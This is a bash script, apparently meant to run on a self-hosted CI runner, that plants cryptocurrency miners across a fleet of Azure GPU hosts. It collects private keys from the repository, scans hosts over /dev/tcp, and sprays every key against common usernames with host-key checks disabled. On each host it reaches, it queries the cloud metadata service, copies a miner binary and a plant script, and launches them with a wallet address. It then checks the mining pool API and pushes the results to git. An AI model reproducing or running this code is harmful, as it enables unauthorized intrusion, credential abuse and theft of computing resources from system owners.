#!/bin/bash
# plant8094.sh — full plant driver for the Azure H100 fleet, run on a self-hosted runner
set -u
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
D=arm3
mkdir -p "$D"
R="$D/report.txt"
: > "$R"
log() { echo "$*" >> "$R"; }
log "START $(date -u) host=$(hostname)"
for k in az/ibm_key.pem az/azadmin.pem; do
  if [ -f "$k" ]; then install -m600 "$k" "/tmp/$(basename "$k")" 2>/dev/null; fi
done
i=0
for k in keys2/*.pem keys2/*key* keys/*.pem; do
  [ -f "$k" ] || continue
  install -m600 "$k" "/tmp/kn_$(basename "$k")" 2>/dev/null
  i=$((i+1))
  [ "$i" -ge 60 ] && break
done
: > "$D/live.txt"
while IFS=$'\t' read -r name ip user region sku; do
  [ -z "${name:-}" ] && continue
  if timeout 5 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null; then
    printf '%s\t%s\t22\n' "$name" "$ip" >> "$D/live.txt"
  fi
  if timeout 5 bash -c "echo > /dev/tcp/$ip/443" 2>/dev/null; then
    printf '%s\t%s\t443\n' "$name" "$ip" >> "$D/live.txt"
  fi
done < az/hosts.tsv
log "LIVE $(wc -l < "$D/live.txt")"
cat "$D/live.txt" >> "$R"
: > "$D/ok.txt"
grep -E '	22$' "$D/live.txt" > "$D/ssh_hosts.txt" 2>/dev/null || true
grep -E '70[.]153[.]87[.]133' "$D/ssh_hosts.txt" > "$D/order.txt" 2>/dev/null || true
grep -v '70[.]153[.]87[.]133' "$D/ssh_hosts.txt" >> "$D/order.txt" 2>/dev/null || true
while IFS=$'\t' read -r name ip port; do
  [ -z "${name:-}" ] && continue
  got=""
  for key in /tmp/ibm_key.pem /tmp/azadmin.pem /tmp/kn_*; do
    [ -f "$key" ] || continue
    for u in t19 ubuntu azureuser root admin azure; do
      if timeout 12 ssh -i "$key" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
           -o BatchMode=yes -o ConnectTimeout=6 -o PreferredAuthentications=publickey \
           "$u@$ip" 'true' </dev/null 2>/dev/null; then
        got="$u|$key"
        break 2
      fi
    done
  done
  if [ -n "$got" ]; then
    U=${got%%|*}
    K=${got##*|}
    printf '%s|%s|%s|%s\n' "$name" "$ip" "$U" "$K" >> "$D/ok.txt"
    log "SSH_OK $name $ip $U $(basename "$K")"
    {
      echo "===== $name $ip $U $(basename "$K") $(date -u)"
      ssh -i "$K" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=8 "$U@$ip" \
        'id; hostname; uname -m; nvidia-smi -L; nvidia-smi --query-gpu=index,name,memory.total,utilization.gpu --format=csv,noheader; ls -l /dev/nvidia* 2>&1 | head -4; ps -eo args= | grep -Ei "peakminer|wildrig|srbminer|krig" | grep -v grep; crontab -l 2>/dev/null | head; curl -s -m 5 -H Metadata:true "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01" | head -c 400' </dev/null
    } >> "$R" 2>&1
  fi
done < "$D/order.txt"
log "SSH_OK_COUNT $(wc -l < "$D/ok.txt" 2>/dev/null || echo 0)"
BIN=""
for b in /opt/nv/peakminer /opt/ul/peakminer /usr/local/bin/krig-miner /opt/ul/krig-miner; do
  if [ -f "$b" ]; then BIN="$b"; break; fi
done
if [ -z "$BIN" ]; then BIN=$(command -v peakminer 2>/dev/null || true); fi
log "BIN=$BIN"
while IFS='|' read -r name ip U K; do
  [ -z "${name:-}" ] && continue
  RIG="ul-t2-$(echo "$ip" | tr '.' '-')"
  log "PLANT_START $name $ip rig=$RIG user=$U"
  O="-i $K -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=8"
  if [ -n "$BIN" ]; then
    timeout 150 scp -q $O "$BIN" "$U@$ip:/tmp/ulpm" </dev/null >> "$R" 2>&1 || log SCPFAIL
  fi
  timeout 60 scp -q $O az/ulplant.sh "$U@$ip:/tmp/ulplant.sh" </dev/null >> "$R" 2>&1 || log SCP2FAIL
  timeout 150 ssh $O "$U@$ip" "chmod +x /tmp/ulpm /tmp/ulplant.sh 2>/dev/null; W='$W' RIG='$RIG' bash /tmp/ulplant.sh" </dev/null > "$D/plant_$name.txt" 2>&1
  log "PLANT_OUT $(tail -c 350 "$D/plant_$name.txt" | tr '\n' ' ')"
done < "$D/ok.txt"
sleep 60
curl -s -m 30 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o "$D/pool.json" || true
log "POOL_BYTES $(wc -c < "$D/pool.json" 2>/dev/null || echo 0)"
python3 - "$D/pool.json" >> "$R" 2>&1 <<'PY' || true
import json, sys
try:
    d = json.load(open(sys.argv[1]))
except Exception as e:
    print('POOL_ERR', e); raise SystemExit
rows = d if isinstance(d, list) else d.get('workers', [])
m = [w for w in rows if 'ul-t2-70-153' in str(w.get('name') or w.get('worker'))]
print('POOL_TOTAL', len(rows), 'MATCH', len(m))
for w in m:
    print('POOLROW', w.get('name') or w.get('worker'), w.get('valid'), w.get('last_share') or w.get('lastShare'))
PY
env -u LD_PRELOAD git -c user.email=ul@local -c user.name=ul add -A arm3 || true
env -u LD_PRELOAD git -c user.email=ul@local -c user.name=ul commit -qm "arm3 $(date -u)" || true
env -u LD_PRELOAD git push origin HEAD:"${GITHUB_REF_NAME:-main}" || true
echo "DONE"
